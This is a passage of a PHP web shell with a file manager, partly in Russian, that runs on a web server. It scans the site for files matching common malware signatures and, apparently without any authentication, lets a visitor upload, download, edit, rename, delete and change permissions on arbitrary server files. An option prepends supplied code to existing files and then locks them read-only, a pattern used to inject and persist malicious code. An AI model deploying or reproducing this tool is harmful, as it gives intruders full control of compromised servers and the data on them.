	$finderdata_path = $_SERVER['DOCUMENT_ROOT']."/finderdata.txt";
	$good_result_path = $_SERVER['DOCUMENT_ROOT']."/goodfinderdata.txt";;
	
	
	
	$search_str = 'eval(base64_decode(';
	$search_str2 = 'Array(base64_decode(';
	$search_str3 = '@$isbot';
	$search_str4 = '@require';
	$search_str5 = 'eval(gzuncompress(base64_decode(';
	$search_str6 = '@include "\x2';
	$search_str7 = '$OO';
	$search_str8 = 'cache=00';
	$search_str9 = 'file_get_contents(\"../index.php\")"';
	$search_str10 = 'is_uploaded_file';
	$search_str11 = 'base64_decode($_POST';
	$search_str12 = 'multipart/form-data';
	
	if (!file_exists($finderdata_path))
	{
		$arr_php_file = findshells($_SERVER['DOCUMENT_ROOT']);

		$f = fopen ($finderdata_path, "a");
		foreach ($arr_php_file as $each)
		{
			if ($each !== $_SERVER['SCRIPT_FILENAME'])
				fwrite($f, $each."\n");
		}
		fclose($f);
		
		if (file_exists($finderdata_path))
		{
			$redirect = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $_SERVER['SCRIPT_FILENAME']);
			$redirect = 'http://'.$redirect.'?finder';;
			?>	
			<script language = 'javascript'>
			var delay = 300;
			setTimeout("document.location.href='<?php echo $redirect;?>'", delay);
			</script>
			<?php	
		}
		else
			echo 'error: file finderdata.txt can not create';
		
	}
	else
	{
		$all_path = read_file($finderdata_path);
		$urls_for_work = array ();
		
		for ( $u=0; $u < 900; $u++ )
		{
			if (($all_path[$u] !== null) and ($all_path[$u] !== ' ') and ($all_path[$u] !== '') and ($all_path[$u] !== '.') and ($all_path[$u] !== '..'))
				$urls_for_work[] = trim($all_path[$u]);
		}

		for ( $i=0; $i < 900; $i++ )
		{
			unset($all_path[$i]);
		}
				
		$fnew = fopen($finderdata_path, "w");
		foreach ($all_path as $each_path)
		{
			if (($each_path !== null) and ($each_path !== '') and ($each_path !== ' '))
				fwrite($fnew, $each_path."\n");
		}
		fclose($fnew);

		foreach ($urls_for_work as $each_for_check)
		{
			if (file_exists($each_for_check))
			{
				if (((filesize($each_for_check)) < 5000000))
				$each_read = only_read($each_for_check);
				else
					$each_read = '';
				
				$result = stristr($each_read, $search_str);
				$result2 = stristr($each_read, $search_str2);
				$result3 = stristr($each_read, $search_str3);
				$result4 = stristr($each_read, $search_str4);
				$result5 = stristr($each_read, $search_str5);
				$result6 = stristr($each_read, $search_str6);
				$result7 = stristr($each_read, $search_str7);
				$result8 = stristr($each_read, $search_str8);
				$result9 = stristr($each_read, $search_str9);
				$result10 = stristr($each_read, $search_str10);
				$result11 = stristr($each_read, $search_str11);
				$result12 = stristr($each_read, $search_str12);
				if (($result !== false) or ($result2 !== false) or ($result3 !== false) or ($result4 !== false) or ($result5 !== false) or ($result6 !== false) or ($result7 !== false) or ($result8 !== false) or ($result9 !== false) or ($result10 !== false) or ($result11 !== false) or ($result12 !== false))
				{
					$f = fopen ($good_result_path, "a");
					fwrite($f, $each_for_check."\n");
					fclose($f);
				}
			}
		}
		
		if (count($all_path)>0)
			echo count($all_path)." files for check<br>";
		else
			echo '<tr><td>Finish!</td></tr>';
		
		$for_check = read_file($finderdata_path);
		if (file_exists($finderdata_path) and (filesize($finderdata_path)>1))
		{
			$redirect = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $_SERVER['SCRIPT_FILENAME']);
			$redirect = 'http://'.$redirect.'?finder';;
			?>	
			<script language = 'javascript'>
			var delay = 100;
			setTimeout("document.location.href='<?php echo $redirect;?>'", delay);
			</script>
			<?php
		}
		else
		{
			$arr_result = read_file($good_result_path);
			
			foreach ($arr_result as $each)
			{
				if (($each !== null) and ($each !== '') and ($each !== ' '))
				{
					if (isset ($_GET['dir']))
						$dr = $_GET['dir'];
					else
						$dr = $_SERVER['DOCUMENT_ROOT'];
					
					
					$time = get_time($each);
					
					$real_url = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $each);
					
					echo "<tr bgcolor=\"#ffffff\" align=\"center\"><td align=\"left\" >"."<a style=\"text-decoration: none;\" href=\"http://$domain$script_path?edit=$each&dir=$dr\"><font color=\"black\">$each</font></a>"."</td><td>".get_filesize($each)."</td><td>$time</td><td>".perms($each, '0')."</td><td>"."<a href=\"http://$domain$script_path?del=$each&dir=$dr\">U</a>&nbsp;"."<a href=\"http://$domain$script_path?edit=$each&dir=$dr\">E</a>&nbsp;"."<a target=\"_blank\" href=\"http://$real_url\">O</a>&nbsp;"."<a href=\"http://$domain$script_path?download=$each&dir=$dr\">D</a>"."</td></tr>";
				}
			}
			if (file_exists($finderdata_path))
				unlink($finderdata_path);
			
			if (file_exists($good_result_path))
				unlink($good_result_path);
		}
	}
}
if (isset ($_GET['download']))
{
	$file_for_save = $_GET['download'];
		
	if (file_exists($file_for_save))
	{	
		header('Content-Description: File Transfer');
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename=' . basename($file_for_save));
		header('Content-Transfer-Encoding: binary');
		header('Expires: 0');
		header('Cache-Control: must-revalidate');
		header('Pragma: public');
		header('Content-Length: ' . filesize($file_for_save));
		readfile($_GET['download']);
		exit;
	}
}
?>
<?php
//set_time_limit (0);

function get_filesize($file)
{
	if(!file_exists($file)) return "Файл  не найден";
	$filesize = filesize($file);
   if($filesize > 1024)
   {
       $filesize = ($filesize/1024);
       if($filesize > 1024)
       {
            $filesize = ($filesize/1024);
           if($filesize > 1024)
           {
               $filesize = ($filesize/1024);
               $filesize = round($filesize, 1);
               return $filesize." gb";       
           }
           else
           {
               $filesize = round($filesize, 1);
               return $filesize." mb";   
           }       
       }
       else
       {
           $filesize = round($filesize, 1);
           return $filesize." kb";   
       }  
   }
   else
   {
       $filesize = round($filesize, 1);
       return $filesize." b";   
   }
}

function get_time($file)
{
	if(!file_exists($file)) return "no info";
	
	$last_update = filemtime($file);
	$time = date('Y-m-d H:i:s', $last_update);
	
	return $time;
}





function perms($filename, $check)
{
    $perms = substr(decoct(fileperms($filename)), -3);
	if ($perms == '644')
		$color = 'green';
	elseif ($perms == '755')
		$color = '#2EC842';
	elseif ($perms == '444')
		$color = 'brown';
	elseif ($perms == '000')
		$color = 'red';
	elseif ($perms == '744')
		$color = 'orange';
	elseif ($perms == '664')
		$color = 'green';
	else
		$color = 'grey';
	if ($check == 1)	
		return $perms;
	else
		return "<font color=$color>".$perms."</font>";
}
function CMS()
{
	if ((is_dir($_SERVER['DOCUMENT_ROOT'].'/administrator/')) and (is_dir($_SERVER['DOCUMENT_ROOT'].'/components/')) and (is_dir($_SERVER['DOCUMENT_ROOT'].'/includes/')))
		return "Joomla!";
	elseif ((is_dir($_SERVER['DOCUMENT_ROOT'].'/wp-content/')) and (is_dir($_SERVER['DOCUMENT_ROOT'].'/wp-admin/')) and (is_dir($_SERVER['DOCUMENT_ROOT'].'/wp-includes/')))
		return "WordPress"; 
	else
		return "Unknown";
}
function folder_separate($path)
{
	$pos_end = strripos($path, '/');
	$path2 = substr_replace($path, '', $pos_end, 99999);
				
	return $path2;
}

function side_bar($make_file)
{
	echo '<td align="right" colspan="2">';
	
	echo "<form action = '".$make_file."' method = 'POST'>";
	echo "<input name=\"search_file\" size=\"7\" type=\"text\" placeholder=\".suspected\" />";
	echo "<input type=\"submit\" value=\"ok\" /></form>";
	
	echo "<form action = '".$make_file."' method = 'POST'>";
	echo "<input name=\"new_file\" size=\"7\" type=\"text\" placeholder=\"make file\" />";
	echo "<input type=\"submit\" value=\"ok\" /></form>";
				
	echo "<form action = '".$make_file."' method = 'POST'>";
	echo "<input name=\"new_dir\" size=\"7\" type=\"text\" placeholder=\"make dir\" />";
	echo "<input type=\"submit\" value=\"ok\" /></form>";
	echo '</td></tr>';
}

if (isset($_GET['rename']))
{
	if (!empty($_POST ['n_name']))
	{
		if (rename($_GET['rename'], $_POST ['n_name']))
			$message_rename = '<font color="green"><b>Name changed!</b></font>';
		else
			$message_rename = '<font color="red"><b>Name can not be changed</b></font>';
			
		echo $message_rename;
	}
}

function edit_file($file, $current)
{
	if (!empty($_POST['chm']))
	{
		if ($_POST['chm'] == '0755')
		{
			if (chmod($file, 0755))
				$message_chmod = '<font color="green"><b>Permission changed!</b></font>';
			else
				$message_chmod = '<font color="red"><b>Unable change permission!</b></font>';
		}
		elseif ($_POST['chm'] == '0444')
		{
			if (chmod($file, 0444))
				$message_chmod = '<font color="green"><b>Permission changed!</b></font>';
			else
				$message_chmod = '<font color="red"><b>Unable change permission!</b></font>';
		}
		elseif ($_POST['chm'] == '0644')
		{
			if (chmod($file, 0644))
				$message_chmod = '<font color="green"><b>Permission changed!</b></font>';
			else
				$message_chmod = '<font color="red"><b>Unable change permission!</b></font>';
		}
		else
			$message_chmod = '0755<br>0444<br>0644<br>';
		
		echo $message_chmod;
	}
	if (empty($_POST['new']))
	{
		$pos_end = strripos($file, '/');
		$dir = substr_replace($file, '', $pos_end, 99999);

		if (file_exists($file) and (filesize($file)>1))
		{
			if (!$fp = fopen ($file, "r"))
			{
				echo 'no have permission<br>';
				$file_cont = 'can\'t show';
			}
			else
			{
				$file_cont = fread ($fp, filesize ($file));
				fclose ($fp);
			}
		}
		else
			$file_cont = '';
		
		$file_cont = str_replace ("<textarea>", "<textarea>", $file_cont);
		$file_cont = htmlspecialchars($file_cont);

		echo "<tr><td align=\"center\" colspan=\"5\"><form action = 'http://".$current."?edit=".$file."&dir=".$dir."' method = 'POST'>\n";
		echo "File: ". $file . "<br>\n";
		echo "<textarea name = 'new' rows = '20' cols = '120'>".$file_cont."</textarea><br>\n";
		echo "<div align=\"right\"><br><input type = 'submit' value = 'Save'></div></form></td></tr>\n";
		
		echo "<tr><td align=\"left\"><form action = 'http://".$current."?edit=".$file."&dir=".$dir."' method = 'POST'>\n";
		echo "<input name=\"chm\" size=\"4\" type=\"text\" placeholder=\"".perms($file, '1')."\"/>";
		echo "<input type=\"submit\" value=\"ok\" /></form></td>\n";
		
		echo "<td colspan=\"3\" align=\"left\"><form action = 'http://".$current."?rename=".$file."&dir=".$dir."' method = 'POST'>\n";
		echo "<input type=\"text\" name='n_name' size=\"72\" value=\"$file\">";
		echo "<input type=\"submit\" value=\"ok\" /></form></td></tr>\n";
	}
	else 
	{
		if (!empty($_POST['new_remote']))
		{
			if (!chmod($file, 0755))
				return "no have permission for chmod!";
			
			$file_cont = only_read($file);
			$file_cont = $_POST['new'].$file_cont;
			
			$fp = fopen ($file, "w");
			if (fwrite ($fp, $file_cont))
				$message = ' - <font color="green"><b>Edited!</b></font>';
			else
				$message = ' - <font color="red"><b>Unable to edit!</b></font>';
			fclose ($fp);
			if (!chmod($file, 0444))
				return "no have permission for chmod!";
		}
		else
		{
			if (!chmod($file, 0755))
				return "no have permission for chmod!";
			
			$fp = fopen ($file, "w");
			if (fwrite ($fp, $_POST ['new']))
				$message = ' - <font color="green"><b>Edited!</b></font>';
			else
				$message = ' - <font color="red"><b>Unable to edit!</b></font>';
			fclose ($fp);
		}
		
		$pos_end = strripos($file, '/');
		$dir = substr_replace($file, '', $pos_end, 99999);

		$fp = fopen ($file, "r");
		$file_cont = fread ($fp, filesize ($file));
		fclose ($fp);
		
		
		$file_cont = str_replace ("<textarea>", "<textarea>", $file_cont);
		
		echo "<tr><td align=\"center\" colspan=\"5\"><form action = 'http://".$current."?edit=".$file."&dir=".$dir."' method = 'POST'>\n";
		echo "File: ". $file . $message . "<br>\n";
		echo "<textarea name = 'new' rows = '20' cols = '120'>".$file_cont."</textarea><br>\n";
		echo "<div align=\"right\"><br><input type = 'submit' value = 'Save'></div></form></td></tr>\n";
		
		echo "<tr><td align=\"left\"><form action = 'http://".$current."?edit=".$file."&dir=".$dir."' method = 'POST'>\n";
		echo "<input name=\"chm\" size=\"4\" type=\"text\" placeholder=\"".perms($file, '1')."\"/>";
		echo "<input type=\"submit\" value=\"ok\" /></form></td>\n";
		
		echo "<td colspan=\"3\" align=\"left\"><form action = 'http://".$current."?rename=".$file."&dir=".$dir."' method = 'POST'>\n";
		echo "<input type=\"text\" name='n_name' size=\"72\" value=\"$file\">";
		echo "<input type=\"submit\" value=\"ok\" /></form></td></tr>\n";
		
		if (chmod($file, 0444))
			$message_chmod_last = '<font color="green"><b>Permission changed!</b></font>';
		else
			$message_chmod_last = '<font color="red"><b>Unable change permission!</b></font>';
	}
	
}

if (isset ($_GET['del']))
{
	if (is_dir($_GET['del']))
		clear_folder($_GET['del']);
	else
		del_file($_GET['del']);
	
}

$domain = $_SERVER['SERVER_NAME'];
$script_path = $_SERVER['SCRIPT_NAME'];
$arr_folder = array();
$arr_filenames = array();
?>
	<tr align="left">
		<td colspan="3">
		<?php
		if (sizeof($_FILES)!=0)
		{	
			if(isset($_FILES) && $_FILES['inputfile']['error'] == 0)
			{
				if (isset ($_GET['dir']))
					$path = $_GET['dir'];
				else
					$path = $_SERVER['DOCUMENT_ROOT'];
					
				$destiation_dir = $path .'/'.$_FILES['inputfile']['name'];
				move_uploaded_file($_FILES['inputfile']['tmp_name'], $destiation_dir );
				
				$open_upload_file = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $destiation_dir); 
				echo '<font color="green"><b>'."<a target=\"_blank\" href=\"http://$open_upload_file\">File Uploaded!</a>".'</b></font>';
			}
		}
		elseif(sizeof($_FILES)!=0)
			echo '<font color="red"><b>No File Uploaded</b></font>';
				
		if (isset ($_GET['dir']))
			$path_for_upload = $_SERVER['SCRIPT_NAME'].'?dir='.$_GET['dir'];
		else
			$path_for_upload = $_SERVER['SCRIPT_NAME'].'?dir='.$_SERVER['DOCUMENT_ROOT'];
			?>
			<form method="post" action="<?php echo $path_for_upload;?>" enctype="multipart/form-data">
			<input type="file" id="inputfile" name="inputfile">
			<input type="submit" value="ok">
			</form>
			CMS: <?php echo CMS();?><br>
			Server IP: <?php echo $_SERVER['SERVER_ADDR'];?><br>
			Root: <?php echo '<a href="'.'http://'.$domain.$script_path.'?dir='.$_SERVER['DOCUMENT_ROOT'].'">'.$_SERVER['DOCUMENT_ROOT'].'</a>'; ?>
			<br><br>
			Directory: 
			<?php 
			if (isset ($_GET['dir'])) 
				$path = $_GET['dir'];
			else
				$path = $_SERVER['DOCUMENT_ROOT'];
	
			
			$arr_path = explode("/", $path);
			$slesh_count = count($arr_path)-1;

			$arr_links = array();
			$path_for_work = $path;
			
			for ($i=1; $i <= $slesh_count; $i++)
			{
				$path_for_work = folder_separate($path_for_work);
				$arr_links[] = $path_for_work;
			}
			for ($i=1; $i <= $slesh_count; $i++)
			{
				$k = $slesh_count - $i - 1;
				if ($i !== $slesh_count)
					echo '<a href="http://'.$domain.$script_path.'?dir='.$arr_links["$k"].'">'.$arr_path["$i"].'</a>/';
				else
					echo '<a href="http://'.$domain.$script_path.'?dir='.$path.'">'.$arr_path["$i"].'</a>';
			}
			?>
			
			
		</td>
	<?php
	
		if (isset ($_GET['dir']))
		{
			if (isset ($_POST['new_file_name']))
			{
				$new_file = $_GET['dir'] . '/' . $_POST['new_file_name'];
				$make_file = 'http://' . $domain . $script_path . '?dir=' . $_GET['dir'] . '&edit=' . $new_file;
			}
			else
				$make_file = 'http://' . $domain . $script_path . '?dir=' . $_GET['dir'];
		}
		else
		{
			if (isset ($_POST['new_file_name']))
			{
				$new_file = $_SERVER['DOCUMENT_ROOT']. '/' . $_POST['new_file_name'];
				$make_file = 'http://' . $domain . $script_path . '?dir=' . $_GET['dir'] . '&edit=' . $new_file;
			}
			else
				$make_file = 'http://' . $domain . $script_path . '?dir=' . $_SERVER['DOCUMENT_ROOT'];
		}	
	
	
	
		if ((empty($_POST ['new_file'])) and (empty($_POST ['search_file'])) and (empty($_POST ['new_dir'])))
		{
			if (isset ($_GET['dir']))
				$path = $_GET['dir'];
			else
				$path = $_SERVER['DOCUMENT_ROOT'];
			
			$make_file = 'http://' . $domain . $script_path . '?dir=' . $path;
			
			side_bar($make_file);
		}
		elseif (!empty($_POST ['new_file']))
		{
			if (isset ($_GET['dir']))
				$path = $_GET['dir'].'/'.$_POST ['new_file'];
			else
				$path = $_SERVER['DOCUMENT_ROOT'].'/'.$_POST ['new_file'];
			
			$make_file = 'http://' . $domain . $script_path . '?dir=' . $_GET['dir'] . '&edit=' . $path;

			if ($fp = fopen ($path, "w"))
			{
				echo '<font color="green">File created successfully!</font>';
				side_bar($make_file);
			}
			else
			{
				echo '<font color="red">Can not create!</font>';
				side_bar($make_file);
			}
			fclose ($fp);
		}
		elseif (!empty($_POST['new_dir']))
		{
			if (isset($_GET['dir']))
				$path = $_GET['dir'].'/'.$_POST['new_dir'];
			else
				$path = $_SERVER['DOCUMENT_ROOT'].'/'.$_POST['new_dir'];
			
			$make_file = 'http://' . $domain . $script_path . '?dir=' . $_GET['dir'] . '&new_dir=' . $path;

			if ($fp = mkdir($path))
			{
				side_bar($make_file);
				echo "<tr align=\"center\"><td align=\"left\" >"."<font color=\"green\">Folder created successfully!</font></td>"."<td></td><td></td><td></td><td></td></tr>";
			}
			else
			{
				side_bar($make_file);
				echo "<tr align=\"center\"><td align=\"left\" >"."<font color=\"red\">Can not create folder!</font></td>"."<td></td><td></td><td></td><td></td></tr>";
			}
		}
		elseif (!empty($_POST['search_file']))
		{
			$file_name_for_search = $_POST['search_file'];
			$arr_all_filenames = findshells($_SERVER['DOCUMENT_ROOT']);
				
			if (isset ($_GET['dir']))
				$dr = $_GET['dir'];
			else
				$dr = $_SERVER['DOCUMENT_ROOT'];
			
			side_bar($make_file);
			
			foreach ($arr_all_filenames as $each_file_name)
			{
				$result = stristr($each_file_name, $file_name_for_search);
				if ($result !== false)
				{
					$time = get_time($each_file_name);
					$real_url = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $each_file_name);
					echo "<tr bgcolor=\"#ffffff\" align=\"center\"><td align=\"left\" >"."<a style=\"text-decoration: none;\" href=\"http://$domain$script_path?edit=$each_file_name&dir=$dr\"><font color=\"black\">$each_file_name</font></a>"."</td><td>".get_filesize($each_file_name)."</td><td>$time</td><td>".perms($each_file_name, '0')."</td><td>"."<a href=\"http://$domain$script_path?del=$each_file_name&dir=$dr\">U</a>&nbsp;"."<a href=\"http://$domain$script_path?edit=$each_file_name&dir=$dr\">E</a>&nbsp;"."<a target=\"_blank\" href=\"http://$real_url\">O</a>&nbsp;"."<a href=\"http://$domain$script_path?download=$each_file_name&dir=$dr\">D</a>"."</td></tr>";
				}
			}
		}
		
		
	if (isset ($_GET['edit']))
	{
		$current = $domain.$script_path;
		edit_file($_GET['edit'], $current);
	}
	?>
	
	<tr align="center" style="color: #423c63;"><td align="left"><b>Name</b></td><td><b>Size</b></td><td><b>Modify</b></td><td><b>Permissions</b></td><td><b>Actions</b></td></tr>

	<?php
	
	if (isset ($_GET['dir']))
	{
		$arr_files = scandir($_GET['dir']);
	}
	else
	{
		$arr_files = scandir($_SERVER['DOCUMENT_ROOT']);
	}

	foreach ($arr_files as $each)
	{
		$str_for_search = $each;
		if (isset ($_GET['dir']))
			$str_for_search = $_GET['dir'].'/'.$each;
		else
			$str_for_search = $_SERVER['DOCUMENT_ROOT'].'/'.$each;

		if (is_dir($str_for_search))
			$arr_folder[] = $each;
		else
			$arr_filenames[] = $each;
	}
	$k = 0;	
	foreach ($arr_folder as $each)
	{
		if (($each !== '.') and ($each !== '..'))
		{
			if (isset ($_GET['dir']))
			{
				$p = $_GET['dir'].'/'.$each;
				$next_dir = $_GET['dir'].'/'.$each;
			}
			else
			{
				$p = $_SERVER['DOCUMENT_ROOT'].'/'.$each;
				$next_dir = $_SERVER['DOCUMENT_ROOT'].'/'.$each;
			}
			
			$path_for_unlink = $next_dir;
			$for_del = strrchr($path_for_unlink, '/');
			$path_for_unlink = str_replace($for_del, '', $path_for_unlink);
		
			$time = get_time($p);
			
			if ($k % 2 == 0)
				$color_bg = '#fff8e7';
			else
				$color_bg = '#ffffe0';
			
			echo "<tr bgcolor=\"$color_bg\" align=\"center\"><td align=\"left\" >"."<font color=\"#904d30\"><b><a href=\"http://$domain$script_path?dir=$next_dir\">$each</a></b></font>"."</td><td>dir</td><td>$time</td><td>".perms($p, '0')."</td><td>"."<a href=\"http://$domain$script_path?del=$p&dir=$path_for_unlink\">U</a>&nbsp;"."</td></tr>";
			$k++;
		}
	}
	

	foreach ($arr_filenames as $each)
	{
		
		if (isset ($_GET['dir']))
		{
			$p = $_GET['dir'].'/'.$each;
			$dr = $_GET['dir'];
		}
			
		else
		{
			$p = $_SERVER['DOCUMENT_ROOT'].'/'.$each;
			$dr = $_SERVER['DOCUMENT_ROOT'];
		}
		$time = get_time($p);
		
		$real_url = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $p);
		
		if ($k % 2 == 0)
			$color_bg = '#fff8e7';
		else
			$color_bg = '#ffffe0';

		$per = stristr($each, '.zip');
		if ($per !== false)
			$per = "<a href=\"http://$domain$script_path?unzip=$p&dir=$dr\">Z</a>&nbsp;";
		else
			$per = "<a href=\"http://$domain$script_path?edit=$p&dir=$dr\">E</a>&nbsp;";
 
		echo "<tr bgcolor=\"$color_bg\" align=\"center\"><td align=\"left\" >"."<a style=\"text-decoration: none;\" href=\"http://$domain$script_path?edit=$p&dir=$dr\"><font color=\"black\">$each</font></a>"."</td><td>".get_filesize($p)."</td><td>$time</td><td>".perms($p, '0')."</td><td>"."<a href=\"http://$domain$script_path?del=$p&dir=$dr\">U</a>&nbsp;".$per."<a target=\"_blank\" href=\"http://$real_url\">O</a>&nbsp;"."<a href=\"http://$domain$script_path?download=$p&dir=$dr\">D</a>"."</td></tr>";
		
		$k++;
	}
?>
</table>
